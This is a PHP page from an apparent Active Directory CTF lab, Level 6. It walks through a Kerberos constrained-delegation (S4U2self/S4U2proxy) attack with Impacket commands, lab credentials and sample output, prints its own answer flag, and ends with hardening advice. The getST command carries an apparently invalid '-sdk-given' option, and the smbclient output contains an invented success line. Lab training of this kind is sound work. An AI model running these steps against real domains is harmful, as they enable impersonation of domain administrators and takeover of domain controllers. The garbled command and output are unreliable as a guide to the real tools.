<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 6: Constrained Delegation (S4U2self / S4U2proxy)
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[244] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{Constrained_Delegation_S4U2Proxy_TGT_Impersonation}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag6'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第六关】成就 (+300 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查获取的服务票据与中继路径。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-primary" style="font-size: 14px; border-radius: 6px;">LEVEL 6</span>
                            第六关：Kerberos 约束性委派 (S4U2self / S4U2proxy) 身份伪造与提权
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.138 (castelblack - sql_svc)</code> $\to$ <code>192.168.56.136 (winterfell)</code> | <strong>分值：</strong> 300 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-refresh" style="color: #6366f1;"></i> 攻击原理剖析 (S4U 扩展协议)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    当某个服务账户配置了 **约束性委派 (Constrained Delegation)** 并启用了 <code>msDS-AllowedToDelegateTo</code> 属性时，Kerberos 允许该服务使用协议扩展：
                </p>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8;">
                    <li><strong>S4U2self (Service for User to Self)：</strong> 允许服务账户代表<strong>任意域用户</strong>（哪怕该用户未与服务交互）向 KDC 申请一张发给自身的服务票据。</li>
                    <li><strong>S4U2proxy (Service for User to Proxy)：</strong> 拿着 S4U2self 获得的票据，向 KDC 申请访问目标服务（如 CIFS/SMB）的最高权限服务票据！</li>
                </ul>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：查询配置了约束性委派的服务账号</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    在 Linux 攻击机上使用 Impacket 的 <code>findDelegation.py</code> 查询域内委派关系：
                </p>
                <div class="cmd-box">
impacket-findDelegation north.sevenkingdoms.local/jon.snow:iknownothing -dc-ip 192.168.56.136
                </div>
                <div class="output-box">
AccountName  AccountType  DelegationType       DelegationRightsTo
-----------  -----------  -------------------  ------------------
sql_svc      User         Constrained (S4U)    CIFS/winterfell.north.sevenkingdoms.local
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    发现 <code>sql_svc</code> 拥有访问子域控 <code>winterfell</code> 的 CIFS (SMB 共享) 委派权限。
                </p>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：利用 getST.py 发起 S4U2self & S4U2proxy 票据请求</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用已破译的 <code>sql_svc</code> 口令（`MYpassword123#`），代表域管理员 <code>administrator</code> 向 KDC 申请 CIFS 服务票据：
                </p>
                <div class="cmd-box">
impacket-getST -sdk-given north.sevenkingdoms.local/sql_svc:'MYpassword123#' -spn CIFS/winterfell.north.sevenkingdoms.local -impersonate administrator -dc-ip 192.168.56.136
                </div>
                <div class="output-box">
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2proxy
[*] Saving ticket in administrator.ccache
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title">步骤 3：导入 CCACHE 票据并完全接管域控文件与服务</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    将生成的票据加载至环境变量，利用 <code>smbclient</code> 或 <code>psexec</code> 远程连接域控：
                </p>
                <div class="cmd-box">
export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass winterfell.north.sevenkingdoms.local
                </div>
                <div class="output-box">
Type 'help' for a list of available commands.
# use C$
# ls \Windows\System32\config\
[+] Successfully accessed domain controller file system as Domain Administrator!
                </div>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    利用约束性委派成功伪造 Domain Admin 票据并访问域控后，提取 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{Constrained_Delegation_S4U2Proxy_TGT_Impersonation}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>开启敏感账号不可委派：</strong> 为特权管理员勾选 <code>Account is sensitive and cannot be delegated</code>（账号敏感且不能委派）。</li>
                    <li><strong>加入 Protected Users 组：</strong> 将高权用户放入 <code>Protected Users</code> 安全组，强制禁止 Kerberos 委派。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
